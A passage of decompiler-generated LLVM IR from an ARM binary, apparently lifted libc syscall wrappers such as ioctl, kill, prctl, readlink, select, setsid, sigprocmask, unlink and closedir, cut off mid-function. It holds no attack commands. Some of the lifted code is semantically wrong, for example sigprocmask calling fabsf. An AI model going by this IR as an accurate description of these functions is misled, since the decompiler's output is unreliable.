  br i1 %tmp, label %dec_label_pc_11354, label %dec_label_pc_1133c

dec_label_pc_1133c:                               ; preds = %dec_label_pc_1131c
  %v0_11340 = call i32 @__aeabi_read_tp()
  %v3_11344 = load i16, i16* @global_var_22294.357, align 2
  %v4_11344 = sext i16 %v3_11344 to i32
  store i32 %v4_11344, i32* @r3, align 4
  %v0_11348 = load i32, i32* @r2, align 4
  %v1_11348 = sub i32 0, %v0_11348
  store i32 %v1_11348, i32* @r2, align 4
  %v3_1134c = add i32 %v4_11344, %v0_11340
  %v4_1134c = inttoptr i32 %v3_1134c to i32*
  store i32 %v1_11348, i32* %v4_1134c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11354

dec_label_pc_11354:                               ; preds = %dec_label_pc_1131c, %dec_label_pc_1133c
  %v0_11354 = phi i32 [ %v0_11300, %dec_label_pc_1131c ], [ -1, %dec_label_pc_1133c ]
  br label %dec_label_pc_113a8

dec_label_pc_1135c:                               ; preds = %dec_label_pc_11310, %bb
  %v0_1135c = call i32 @__libc_enable_asynccancel()
  %v0_11360 = load i32, i32* @r7, align 4
  store i32 %v0_11360, i32* @r1, align 4
  store i32 %v0_1135c, i32* %r6.global-to-local, align 4
  %v0_1136c = load i32, i32* @r5, align 4
  store i32 %v0_1136c, i32* %r0.global-to-local, align 4
  store i32 %v0_1136c, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_1136c, -4095
  br i1 %tmp15, label %dec_label_pc_1139c, label %dec_label_pc_11384

dec_label_pc_11384:                               ; preds = %dec_label_pc_1135c
  %v1_11388 = sub i32 0, %v0_1136c
  %v0_1138c = call i32 @__aeabi_read_tp()
  store i32 %v0_1138c, i32* %r0.global-to-local, align 4
  %v3_11390 = load i16, i16* @global_var_22294.357, align 2
  %v4_11390 = sext i16 %v3_11390 to i32
  store i32 %v4_11390, i32* @r3, align 4
  %v3_11394 = add i32 %v4_11390, %v0_1138c
  %v4_11394 = inttoptr i32 %v3_11394 to i32*
  store i32 %v1_11388, i32* %v4_11394, align 4
  store i32 -1, i32* @r2, align 4
  %v0_1139c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1139c

dec_label_pc_1139c:                               ; preds = %dec_label_pc_1135c, %dec_label_pc_11384
  %v0_113a0 = phi i32 [ %v0_1136c, %dec_label_pc_1135c ], [ -1, %dec_label_pc_11384 ]
  %v0_1139c = phi i32 [ %v0_1135c, %dec_label_pc_1135c ], [ %v0_1139c.pre, %dec_label_pc_11384 ]
  store i32 %v0_1139c, i32* %r0.global-to-local, align 4
  store i32 %v0_113a0, i32* @r7, align 4
  %v1_113a4 = call i32 @__libc_disable_asynccancel(i32 %v0_1139c)
  store i32 %v1_113a4, i32* %r0.global-to-local, align 4
  %v0_113a8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_113a8

dec_label_pc_113a8:                               ; preds = %dec_label_pc_11354, %dec_label_pc_1139c
  %v0_113a8 = phi i32 [ %v0_11354, %dec_label_pc_11354 ], [ %v0_113a8.pre, %dec_label_pc_1139c ]
  store i32 %v0_113a8, i32* %r0.global-to-local, align 4
  %v2_113b0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_113b0, i32* @r4, align 4
  store i32 %v6_112dc, i32* @r5, align 4
  store i32 %v12_112dc, i32* @r7, align 4
  ret i32 %v0_113a8

; uselistorder directives
  uselistorder i32 %v0_113a8, { 1, 0 }
  uselistorder i32 %v0_1139c, { 1, 0 }
  uselistorder i32 %v0_1136c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11300, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_113a8, { 1, 0 }
  uselistorder label %dec_label_pc_1139c, { 1, 0 }
  uselistorder label %dec_label_pc_1135c, { 1, 0 }
  uselistorder label %dec_label_pc_11354, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_113dc = load i32, i32* @r0, align 4
  ret i32 %v1_113dc
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_113e0 = load i32, i32* @r3, align 4
  store i32 %v9_113e0, i32* %stack_var_-4, align 4
  %v3_113e4 = load i32, i32* @r4, align 4
  store i32 %v3_113e4, i32* %stack_var_-32, align 4
  %v6_113e4 = load i32, i32* @r5, align 4
  %v12_113e4 = load i32, i32* @r7, align 4
  %v4_113f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 12824) to i32*), align 4
  %v2_113fc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_113fc, i32* @r3, align 4
  %v2_11400 = icmp eq i32 %v4_113f4, 0
  %v0_11408 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11408, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_11400, label %dec_label_pc_11418, label %dec_label_pc_11450

dec_label_pc_11418:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_11408, -4095
  br i1 %tmp, label %dec_label_pc_11448, label %dec_label_pc_11430

dec_label_pc_11430:                               ; preds = %dec_label_pc_11418
  %v1_11434 = sub i32 0, %v0_11408
  %v3_11438 = load i16, i16* @global_var_22294.357, align 2
  %v4_11438 = sext i16 %v3_11438 to i32
  store i32 %v4_11438, i32* @r3, align 4
  %v0_1143c = call i32 @__aeabi_read_tp()
  %v2_11440 = load i32, i32* @r3, align 4
  %v3_11440 = add i32 %v2_11440, %v0_1143c
  %v4_11440 = inttoptr i32 %v3_11440 to i32*
  store i32 %v1_11434, i32* %v4_11440, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11448

dec_label_pc_11448:                               ; preds = %dec_label_pc_11418, %dec_label_pc_11430
  %v0_11448 = phi i32 [ %v0_11408, %dec_label_pc_11418 ], [ -1, %dec_label_pc_11430 ]
  br label %dec_label_pc_1149c

dec_label_pc_11450:                               ; preds = %entry
  %v0_11450 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11450, i32* %r6.global-to-local, align 4
  %v0_11460 = load i32, i32* @r4, align 4
  store i32 %v0_11460, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_11460, -4095
  br i1 %tmp15, label %dec_label_pc_11490, label %dec_label_pc_11478

dec_label_pc_11478:                               ; preds = %dec_label_pc_11450
  %v1_1147c = sub i32 0, %v0_11460
  %v3_11480 = load i16, i16* @global_var_22294.357, align 2
  %v4_11480 = sext i16 %v3_11480 to i32
  store i32 %v4_11480, i32* @r3, align 4
  %v0_11484 = call i32 @__aeabi_read_tp()
  store i32 %v0_11484, i32* %r0.global-to-local, align 4
  %v2_11488 = load i32, i32* @r3, align 4
  %v3_11488 = add i32 %v2_11488, %v0_11484
  %v4_11488 = inttoptr i32 %v3_11488 to i32*
  store i32 %v1_1147c, i32* %v4_11488, align 4
  %v0_11490.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11490

dec_label_pc_11490:                               ; preds = %dec_label_pc_11450, %dec_label_pc_11478
  %v0_11494 = phi i32 [ %v0_11460, %dec_label_pc_11450 ], [ -1, %dec_label_pc_11478 ]
  %v0_11490 = phi i32 [ %v0_11450, %dec_label_pc_11450 ], [ %v0_11490.pre, %dec_label_pc_11478 ]
  store i32 %v0_11490, i32* %r0.global-to-local, align 4
  store i32 %v0_11494, i32* @r7, align 4
  %v1_11498 = call i32 @__libc_disable_asynccancel(i32 %v0_11490)
  store i32 %v1_11498, i32* %r0.global-to-local, align 4
  %v0_1149c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1149c

dec_label_pc_1149c:                               ; preds = %dec_label_pc_11448, %dec_label_pc_11490
  %v0_1149c = phi i32 [ %v0_11448, %dec_label_pc_11448 ], [ %v0_1149c.pre, %dec_label_pc_11490 ]
  store i32 %v0_1149c, i32* %r0.global-to-local, align 4
  %v2_114a4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_114a4, i32* @r4, align 4
  store i32 %v6_113e4, i32* @r5, align 4
  store i32 %v12_113e4, i32* @r7, align 4
  ret i32 %v0_1149c

; uselistorder directives
  uselistorder i32 %v0_1149c, { 1, 0 }
  uselistorder i32 %v0_11490, { 1, 0 }
  uselistorder i32 %v0_11460, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11408, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1149c, { 1, 0 }
  uselistorder label %dec_label_pc_11490, { 1, 0 }
  uselistorder label %dec_label_pc_11448, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_114c0 = load i32, i32* @r7, align 4
  store i32 %v3_114c0, i32* %stack_var_-8, align 4
  %v0_114cc = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_114cc, -4095
  br i1 %tmp, label %dec_label_pc_114ec, label %dec_label_pc_114d4

dec_label_pc_114d4:                               ; preds = %entry
  %v1_114d8 = sub i32 0, %v0_114cc
  %v3_114dc = load i16, i16* @global_var_22294.357, align 2
  %v4_114dc = sext i16 %v3_114dc to i32
  %v0_114e0 = call i32 @__aeabi_read_tp()
  %v3_114e4 = add i32 %v4_114dc, %v0_114e0
  %v4_114e4 = inttoptr i32 %v3_114e4 to i32*
  store i32 %v1_114d8, i32* %v4_114e4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_114ec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_114ec

dec_label_pc_114ec:                               ; preds = %entry, %dec_label_pc_114d4
  %v1_114f0 = phi i32 [ %v0_114cc, %entry ], [ -1, %dec_label_pc_114d4 ]
  %v2_114ec = phi i32 [ %v3_114c0, %entry ], [ %v2_114ec.pre, %dec_label_pc_114d4 ]
  store i32 %v2_114ec, i32* @r7, align 4
  ret i32 %v1_114f0

; uselistorder directives
  uselistorder i32 %v0_114cc, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_114ec, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_114f8 = load i32, i32* @r4, align 4
  store i32 %v3_114f8, i32* %stack_var_-12, align 4
  %v0_11508 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11508, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11508, -4095
  br i1 %tmp, label %dec_label_pc_11530, label %dec_label_pc_11518

dec_label_pc_11518:                               ; preds = %entry
  %v0_1151c = call i32 @__aeabi_read_tp()
  %v3_11520 = load i16, i16* @global_var_22294.357, align 2
  %v4_11520 = sext i16 %v3_11520 to i32
  %v0_11524 = load i32, i32* %r2.global-to-local, align 4
  %v1_11524 = sub i32 0, %v0_11524
  store i32 %v1_11524, i32* %r2.global-to-local, align 4
  %v3_11528 = add i32 %v4_11520, %v0_1151c
  %v4_11528 = inttoptr i32 %v3_11528 to i32*
  store i32 %v1_11524, i32* %v4_11528, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11530.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11530

dec_label_pc_11530:                               ; preds = %entry, %dec_label_pc_11518
  %v1_11534 = phi i32 [ %v0_11508, %entry ], [ -1, %dec_label_pc_11518 ]
  %v2_11530 = phi i32 [ %v3_114f8, %entry ], [ %v2_11530.pre, %dec_label_pc_11518 ]
  store i32 %v2_11530, i32* @r4, align 4
  ret i32 %v1_11534

; uselistorder directives
  uselistorder i32 %v0_11508, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11530, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1153c = load i32, i32* @r7, align 4
  store i32 %v3_1153c, i32* %stack_var_-8, align 4
  %v0_11548 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11548, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_11548, -4095
  br i1 %tmp, label %dec_label_pc_11570, label %dec_label_pc_11558

dec_label_pc_11558:                               ; preds = %entry
  %v0_1155c = call i32 @__aeabi_read_tp()
  %v3_11560 = load i16, i16* @global_var_22294.357, align 2
  %v4_11560 = sext i16 %v3_11560 to i32
  store i32 %v4_11560, i32* @r3, align 4
  %v0_11564 = load i32, i32* @r2, align 4
  %v1_11564 = sub i32 0, %v0_11564
  store i32 %v1_11564, i32* @r2, align 4
  %v3_11568 = add i32 %v4_11560, %v0_1155c
  %v4_11568 = inttoptr i32 %v3_11568 to i32*
  store i32 %v1_11564, i32* %v4_11568, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11570.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11570

dec_label_pc_11570:                               ; preds = %entry, %dec_label_pc_11558
  %v1_11574 = phi i32 [ %v0_11548, %entry ], [ -1, %dec_label_pc_11558 ]
  %v2_11570 = phi i32 [ %v3_1153c, %entry ], [ %v2_11570.pre, %dec_label_pc_11558 ]
  store i32 %v2_11570, i32* @r7, align 4
  ret i32 %v1_11574

; uselistorder directives
  uselistorder i32 %v0_11548, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11570, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1157c = load i32, i32* @r4, align 4
  store i32 %v3_1157c, i32* %stack_var_-12, align 4
  %v0_1158c = load i32, i32* @r0, align 4
  store i32 %v0_1158c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1158c, -4095
  br i1 %tmp, label %dec_label_pc_115b4, label %dec_label_pc_1159c

dec_label_pc_1159c:                               ; preds = %entry
  %v0_115a0 = call i32 @__aeabi_read_tp()
  %v3_115a4 = load i16, i16* @global_var_22294.357, align 2
  %v4_115a4 = sext i16 %v3_115a4 to i32
  %v0_115a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_115a8 = sub i32 0, %v0_115a8
  store i32 %v1_115a8, i32* %r2.global-to-local, align 4
  %v3_115ac = add i32 %v4_115a4, %v0_115a0
  %v4_115ac = inttoptr i32 %v3_115ac to i32*
  store i32 %v1_115a8, i32* %v4_115ac, align 4
  %v2_115b4.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_115b4

dec_label_pc_115b4:                               ; preds = %entry, %dec_label_pc_1159c
  %v1_115b8 = phi i32 [ %v0_1158c, %entry ], [ -1, %dec_label_pc_1159c ]
  %v2_115b4 = phi i32 [ %v3_1157c, %entry ], [ %v2_115b4.pre, %dec_label_pc_1159c ]
  store i32 %v2_115b4, i32* @r4, align 4
  ret i32 %v1_115b8

; uselistorder directives
  uselistorder i32 %v0_1158c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_115b4, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_115c0 = load i32, i32* @r4, align 4
  store i32 %v3_115c0, i32* %stack_var_-28, align 4
  %v6_115c0 = load i32, i32* @r5, align 4
  %v9_115c0 = load i32, i32* @r6, align 4
  %v12_115c0 = load i32, i32* @r7, align 4
  %v15_115c0 = load i32, i32* @r8, align 4
  %v18_115c0 = load i32, i32* @sl, align 4
  %v21_115c0 = load i32, i32* @lr, align 4
  %v4_115d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 12824) to i32*), align 4
  %v2_115d8 = icmp eq i32 %v4_115d0, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_115d8, label %dec_label_pc_115f4, label %entry.dec_label_pc_11600_crit_edge

entry.dec_label_pc_11600_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11600

dec_label_pc_115f4:                               ; preds = %entry
  store i32 %v3_115c0, i32* @r4, align 4
  store i32 %v9_115c0, i32* @r6, align 4
  store i32 %v12_115c0, i32* @r7, align 4
  store i32 %v15_115c0, i32* @r8, align 4
  store i32 %v18_115c0, i32* %sl.global-to-local, align 4
  %v0_115fc = call i32 @__syscall_select()
  br label %dec_label_pc_11600

dec_label_pc_11600:                               ; preds = %entry.dec_label_pc_11600_crit_edge, %dec_label_pc_115f4
  %v0_11600 = call i32 @__libc_enable_asynccancel()
  %v0_11604 = load i32, i32* @r6, align 4
  store i32 %v0_11604, i32* @r1, align 4
  store i32 %v0_11600, i32* @r5, align 4
  %v0_11614 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_11614, i32* @r0, align 4
  %v0_1161c = call i32 @__syscall_select()
  store i32 %v0_1161c, i32* @r4, align 4
  %v0_11624 = load i32, i32* @r5, align 4
  %v1_11628 = call i32 @__libc_disable_asynccancel(i32 %v0_11624)
  %v0_1162c = load i32, i32* @r4, align 4
  %v2_11634 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_11634, i32* @r4, align 4
  store i32 %v6_115c0, i32* @r5, align 4
  store i32 %v9_115c0, i32* @r6, align 4
  store i32 %v12_115c0, i32* @r7, align 4
  store i32 %v15_115c0, i32* @r8, align 4
  store i32 %v18_115c0, i32* @sl, align 4
  store i32 %v21_115c0, i32* @lr, align 4
  ret i32 %v0_1162c

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11600, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11644 = load i32, i32* @r7, align 4
  store i32 %v3_11644, i32* %stack_var_-8, align 4
  %v0_11650 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11650, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11650, -4095
  br i1 %tmp, label %dec_label_pc_11678, label %dec_label_pc_11660

dec_label_pc_11660:                               ; preds = %entry
  %v0_11664 = call i32 @__aeabi_read_tp()
  %v3_11668 = load i16, i16* @global_var_22294.357, align 2
  %v4_11668 = sext i16 %v3_11668 to i32
  %v0_1166c = load i32, i32* %r2.global-to-local, align 4
  %v1_1166c = sub i32 0, %v0_1166c
  store i32 %v1_1166c, i32* %r2.global-to-local, align 4
  %v3_11670 = add i32 %v4_11668, %v0_11664
  %v4_11670 = inttoptr i32 %v3_11670 to i32*
  store i32 %v1_1166c, i32* %v4_11670, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11678.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11678

dec_label_pc_11678:                               ; preds = %entry, %dec_label_pc_11660
  %v1_1167c = phi i32 [ %v0_11650, %entry ], [ -1, %dec_label_pc_11660 ]
  %v2_11678 = phi i32 [ %v3_11644, %entry ], [ %v2_11678.pre, %dec_label_pc_11660 ]
  store i32 %v2_11678, i32* @r7, align 4
  ret i32 %v1_1167c

; uselistorder directives
  uselistorder i32 %v0_11650, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11678, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_11688 = icmp eq i32* %arg2, null
  br i1 %v2_11688, label %dec_label_pc_116cc, label %dec_label_pc_1169c

dec_label_pc_1169c:                               ; preds = %entry
  %v2_1169c = load i32, i32* %arg2, align 4
  %v1_116a0 = icmp slt i32 %v2_1169c, 0
  br i1 %v1_116a0, label %dec_label_pc_116b4, label %dec_label_pc_116a8

dec_label_pc_116a8:                               ; preds = %dec_label_pc_1169c
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_116a8 = load i32, i32* %.pre3, align 4
  %v1_116ac = urem i32 %v3_116a8, 2
  %v2_116ac = icmp eq i32 %v1_116ac, 0
  br i1 %v2_116ac, label %dec_label_pc_116cc, label %dec_label_pc_116b4

dec_label_pc_116b4:                               ; preds = %dec_label_pc_1169c, %dec_label_pc_116a8
  %v2_116b4 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_116b4 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_116cc

dec_label_pc_116cc:                               ; preds = %dec_label_pc_116a8, %entry, %dec_label_pc_116b4
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_11700, label %dec_label_pc_116e8

dec_label_pc_116e8:                               ; preds = %dec_label_pc_116cc
  %v1_116ec = sub i32 0, %arg1
  %v3_116f0 = load i16, i16* @global_var_22294.357, align 2
  %v4_116f0 = sext i16 %v3_116f0 to i32
  %v0_116f4 = call i32 @__aeabi_read_tp()
  %v3_116f8 = add i32 %v4_116f0, %v0_116f4
  %v4_116f8 = inttoptr i32 %v3_116f8 to i32*
  store i32 %v1_116ec, i32* %v4_116f8, align 4
  br label %dec_label_pc_11700

dec_label_pc_11700:                               ; preds = %dec_label_pc_116cc, %dec_label_pc_116e8
  %v1_11708 = phi i32 [ %arg1, %dec_label_pc_116cc ], [ -1, %dec_label_pc_116e8 ]
  ret i32 %v1_11708

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11700, { 1, 0 }
  uselistorder label %dec_label_pc_116cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_116b4, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_11714 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_11724 = call i32 @gettimeofday(i32 %v2_11714, i32 0)
  %v2_11728 = load i32, i32* %stack_var_-16, align 4
  %v2_1172c = icmp eq i32* %arg1, null
  br i1 %v2_1172c, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_11728, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_11728

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11740 = load i32, i32* @r7, align 4
  store i32 %v3_11740, i32* %stack_var_-8, align 4
  %v0_1174c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1174c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1174c, -4095
  br i1 %tmp, label %dec_label_pc_11774, label %dec_label_pc_1175c

dec_label_pc_1175c:                               ; preds = %entry
  %v0_11760 = call i32 @__aeabi_read_tp()
  %v3_11764 = load i16, i16* @global_var_22294.357, align 2
  %v4_11764 = sext i16 %v3_11764 to i32
  %v0_11768 = load i32, i32* %r2.global-to-local, align 4
  %v1_11768 = sub i32 0, %v0_11768
  store i32 %v1_11768, i32* %r2.global-to-local, align 4
  %v3_1176c = add i32 %v4_11764, %v0_11760
  %v4_1176c = inttoptr i32 %v3_1176c to i32*
  store i32 %v1_11768, i32* %v4_1176c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11774.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11774

dec_label_pc_11774:                               ; preds = %entry, %dec_label_pc_1175c
  %v1_11778 = phi i32 [ %v0_1174c, %entry ], [ -1, %dec_label_pc_1175c ]
  %v2_11774 = phi i32 [ %v3_11740, %entry ], [ %v2_11774.pre, %dec_label_pc_1175c ]
  store i32 %v2_11774, i32* @r7, align 4
  ret i32 %v1_11778

; uselistorder directives
  uselistorder i32 %v0_1174c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11774, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_11780 = load i32, i32* @r4, align 4
  store i32 %v3_11780, i32* %stack_var_-24, align 4
  %v9_11780 = load i32, i32* @r6, align 4
  %v12_11780 = load i32, i32* @r7, align 4
  %v15_11780 = load i32, i32* @r8, align 4
  %v18_11780 = load i32, i32* @lr, align 4
  %v2_11784 = load i32, i32* %arg1, align 4
  store i32 %v2_11784, i32* %r3.global-to-local, align 4
  %v3_1178c = icmp eq i32 %v2_11784, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r6, align 4
  br i1 %v3_1178c, label %dec_label_pc_117a0, label %dec_label_pc_117bc

dec_label_pc_117a0:                               ; preds = %entry
  store i32 68324, i32* %r2.global-to-local, align 4
  %v0_117a4 = call i32 @__aeabi_read_tp()
  %v3_117a8 = load i16, i16* @global_var_22294.357, align 2
  %v4_117a8 = sext i16 %v3_117a8 to i32
  store i32 %v4_117a8, i32* %r2.global-to-local, align 4
  %v0_117ac = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_117ac, i32* %r1.global-to-local, align 4
  %v1_117b0 = add i32 %v0_117ac, 10
  store i32 %v1_117b0, i32* %r3.global-to-local, align 4
  %v3_117b4 = add i32 %v4_117a8, %v0_117a4
  %v4_117b4 = inttoptr i32 %v3_117b4 to i32*
  store i32 %v1_117b0, i32* %v4_117b4, align 4
  %v0_11864.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11864

dec_label_pc_117bc:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_117c0 = add i32 %tmp, 24
  store i32 %v1_117c0, i32* %r2.global-to-local, align 4
  %v4_117c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 68) to i32*), align 4
  store i32 %v4_117c8, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_117d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_117d4)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_117ec = load i32, i32* @r6, align 4
  %v2_117ec = add i32 %v0_117ec, 16
  %v3_117ec = inttoptr i32 %v2_117ec to i32*
  %v4_117ec = load i32, i32* %v3_117ec, align 4
  call void @__pseudo_branch(i32 %v4_117ec)
  %v0_117f8 = load i32, i32* @r7, align 4
  %v1_117f8 = inttoptr i32 %v0_117f8 to i32*
  %v2_117f8 = load i32, i32* %v1_117f8, align 4
  store i32 %v2_117f8, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_11808 = load i32, i32* @r8, align 4
  store i32 %v0_11808, i32* %v1_117f8, align 4
  %v0_1180c = load i32, i32* @r6, align 4
  %v1_1180c = load i32, i32* %r3.global-to-local, align 4
  %v2_1180c = add i32 %v1_1180c, %v0_1180c
  %v3_1180c = inttoptr i32 %v2_1180c to i32*
  %v4_1180c = load i32, i32* %v3_1180c, align 4
  store i32 ptrtoint (i32* @global_var_11818.385 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1180c)
  %v0_11818 = load i32, i32* @r7, align 4
  %v1_11818 = add i32 %v0_11818, 12
  %v2_11818 = inttoptr i32 %v1_11818 to i32*
  %v3_11818 = load i32, i32* %v2_11818, align 4
  store i32 %v3_11818, i32* @r0, align 4
  %v0_1181c = call i32 @free()
  %v0_11820 = load i32, i32* @r7, align 4
  store i32 %v0_11820, i32* @r0, align 4
  %v0_11824 = call i32 @free()
  %v0_1182c = load i32, i32* @r4, align 4
  store i32 %v0_1182c, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_1182c, -4095
  br i1 %tmp11, label %dec_label_pc_11860, label %dec_label_pc_11848

